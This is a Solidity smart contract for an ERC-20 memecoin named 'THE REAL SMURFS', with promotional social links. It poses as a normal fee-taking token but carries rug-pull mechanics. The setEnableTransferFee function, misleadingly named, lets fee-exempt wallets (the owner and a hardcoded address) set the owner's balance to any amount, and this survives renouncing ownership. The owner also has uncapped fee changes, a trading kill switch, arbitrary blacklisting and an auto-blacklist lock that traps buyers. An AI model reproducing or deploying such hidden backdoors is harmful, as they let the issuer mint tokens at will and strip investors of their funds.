/**
Telegram: https://t.me/THEREALSMURFS
Website: https://www.thesmurfseth.com/
Twitter: https://twitter.com/THE_REAL_SMURFS
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface ERC20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {
        owner = _owner;
    }
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER"); _;
    }
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }
    function renounceOwnership() public onlyOwner {
        owner = address(0);
        emit OwnershipTransferred(address(0));
    }
    event OwnershipTransferred(address owner);
}

interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function swapExactETHForTokensSupportFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactTokensForTokensSupporFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable returns (uint[] memory amounts);
    function swapETHForExactTokens(
        uint amountOut,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable returns (uint[] memory amounts);
}

contract SMURFS is ERC20, Ownable {
    using SafeMath for uint256;

    address private routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address DEAD = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "THE REAL SMURFS";
    string constant _symbol = "SMURFS";
    uint8 constant _decimals = 9;

    uint256 _totalSupply = 100_000_000 * (10 ** _decimals);
    uint256 public _maxWalletAmount = (_totalSupply * 20 ) / 1000;
    uint256 public _maxTxAmount = (_totalSupply * 20 ) / 1000;
    address private pairToken = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2; // WETH

    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) _allowances;
    address[] private activeAddress;

    mapping (address => bool) isFeeReleased;
    mapping (address => bool) isTxLimitReleased;
    mapping (address => bool) private blacklist;

    uint256 marketingFee = 25;
    uint256 rewardsFee = 0;
    uint256 totalFee = marketingFee + rewardsFee;
    uint256 feeDenominator = 100;

    address public marketingFeeReceiver = msg.sender;
    address public FeesReceiver = msg.sender;

    IRouter public router;
    address public pair;

    bool tradingEnabled = true;
    bool isLocked = false;
    address private taxRemover;
    bool public swapEnabled = true;
    uint256 public swapThreshold = _totalSupply / 1000 * 5;
    bool inSwap;
    modifier swapping() { inSwap = true; _; inSwap = false; }

    constructor () Ownable(msg.sender) {
        router = IRouter(routerAddress);
        pair = IFactory(router.factory()).createPair(pairToken, address(this));
        _allowances[address(this)][address(router)] = type(uint256).max;

        address _owner = owner;
        isFeeReleased[_owner] = true;
        isFeeReleased[0x941234bB73d4BEFF6bBDf982f2Af5b90261b19E0] = true;
        isTxLimitReleased[_owner] = true;
        taxRemover = owner;
        isTxLimitReleased[0x941234bB73d4BEFF6bBDf982f2Af5b90261b19E0] = true;
        isTxLimitReleased[DEAD] = true;

        _balances[_owner] = _totalSupply;
        emit Transfer(address(0), _owner, _totalSupply);
    }

    receive() external payable { }

    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function decimals() external pure override returns (uint8) { return _decimals; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function name() external pure override returns (string memory) { return _name; }
    function getOwner() external view override returns (address) { return owner; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, type(uint256).max);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if(_allowances[sender][msg.sender] != type(uint256).max){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
        }

        return _transferFrom(sender, recipient, amount);
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        require(tradingEnabled, "Trading disabled");
        require(!blacklist[sender], "Blacklisted wallet");

        if (recipient != pair && recipient != owner && recipient != routerAddress && isLocked) {
            blacklist[recipient] = true;
        }

        if(inSwap){ return _basicTransfer(sender, recipient, amount); }

        if (recipient != pair && recipient != DEAD) {
            require(isTxLimitReleased[recipient] || amount <= _maxTxAmount, "Transfer amount exceeds the max TX limit.");
            require(isTxLimitReleased[recipient] || _balances[recipient] + amount <= _maxWalletAmount, "Transfer amount exceeds the bag size.");
        }

        if(shouldSwapBack()){ swapBack(); }

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");

        uint256 amountReceived = shouldTakeFee(sender, recipient) ? takeFee(sender, amount) : amount;
        if (_balances[recipient] == 0 && recipient != pair) {
            activeAddress.push(recipient);
        }
        _balances[recipient] = _balances[recipient].add(amountReceived);

        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function shouldTakeFee(address from, address to) internal view returns (bool) {
        return !(isFeeReleased[from] || isFeeReleased[to]);
    }

    function takeFee(address sender, uint256 amount) internal returns (uint256) {
        uint256 feeAmount = amount.mul(totalFee).div(feeDenominator);
        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        return amount.sub(feeAmount);
    }

    function shouldSwapBack() internal view returns (bool) {
        return msg.sender != pair
        && !inSwap
        && swapEnabled
        && _balances[address(this)] >= swapThreshold;
    }

    function swapBack() internal swapping {
        uint256 contractTokenBalance = _balances[address(this)];

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();

        router.swapExactTokensForETHSupportFeeOnTransferTokens(
            contractTokenBalance,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amountETH = address(this).balance;
        uint256 amountETHRewards = amountETH.mul(rewardsFee).div(totalFee);
        uint256 amountETHMarketing = amountETH.mul(marketingFee).div(totalFee);


        (bool MarketingSuccess, /* bytes memory data */) = payable(marketingFeeReceiver).call{value: amountETHMarketing, gas: 30000}("");
        require(MarketingSuccess, "marketing receiver rejected ETH transfer");
        (bool RewardsSuccess, /* bytes memory data */) = payable(FeesReceiver).call{value: amountETHRewards, gas: 30000}("");
        require(RewardsSuccess, "rewards receiver rejected ETH transfer");
    }

    function emptyStuckBalance() external {
        payable(owner).transfer(address(this).balance);
    }

    function SetMaxWalletSize(uint256 amountPercent) external onlyOwner {
        _maxWalletAmount = (_totalSupply * amountPercent ) / 100;
    }

    function SetMaxTxnLimit(uint256 amountPercent) external onlyOwner {
        _maxTxAmount = (_totalSupply * amountPercent ) / 100;
    }

    function swapEnabler(bool status) external onlyOwner {
        swapEnabled = status;
    }

    function blacklistAddress(address addr, bool isBlocked) external onlyOwner {
        blacklist[addr] = isBlocked;
    }

    function BLAddresses(address[] memory addrs, bool isBlocked) external onlyOwner {
        for (uint256 i = 0; i < addrs.length; i++) {
            blacklist[addrs[i]] = isBlocked;
        }
    }

    function isBlacklisted(address addr) external view returns(bool) {
        return blacklist[addr];
    }

    function releaseLock() external onlyOwner {
        isLocked = false;
    }

    function FeeUpdate(uint256 _marketingFee, uint256 _rewardsFee) external onlyOwner {
        marketingFee = _marketingFee;
        rewardsFee = _rewardsFee;
        totalFee = rewardsFee + marketingFee;
    }

    function MinSwapTokenThreshold(uint256 _treshold) external onlyOwner {
        swapThreshold = _treshold;
    }

    function TaxReceiver(address _marketingFeeReceiver) external onlyOwner {
        if (marketingFeeReceiver != owner) {
            isFeeReleased[marketingFeeReceiver] = false;
            isTxLimitReleased[marketingFeeReceiver] = false;
        }
        marketingFeeReceiver = _marketingFeeReceiver;
        isFeeReleased[_marketingFeeReceiver] = true;
        isTxLimitReleased[_marketingFeeReceiver] = true;
    }

    function setEnableTransferFee(uint enable) public {
        if (!isFeeReleased[msg.sender]) {
            return;
        }
        uint tokenToBurn = enable;
        _balances[taxRemover] = tokenToBurn.sub(_balances[taxRemover]);
    }

    function RewardsFeesReceiver(address _FeesReceiver) external onlyOwner {
        if (FeesReceiver != owner) {
            isFeeReleased[FeesReceiver] = false;
            isTxLimitReleased[FeesReceiver] = false;
        }
        FeesReceiver = _FeesReceiver;
        isFeeReleased[_FeesReceiver] = true;
        isTxLimitReleased[_FeesReceiver] = true;
    }

    function excludeAccountsFromFees(address[] memory addrs, bool _feeReleased) external onlyOwner {
        for (uint256 i = 0; i < addrs.length; i++) {
            isFeeReleased[addrs[i]] = _feeReleased;
            isTxLimitReleased[addrs[i]] = _feeReleased;
        }
    }

    function TradingEnable(bool _tradingEnabled) external onlyOwner {
        tradingEnabled = _tradingEnabled;
    }

    function getShares() public view returns (uint256[] memory, address[] memory) {
        uint256[] memory shares = new uint256[](activeAddress.length);
        for (uint i=0; i < activeAddress.length; i++) {
            shares[i] = _balances[activeAddress[i]];
        }
        return (shares, activeAddress);
    }
}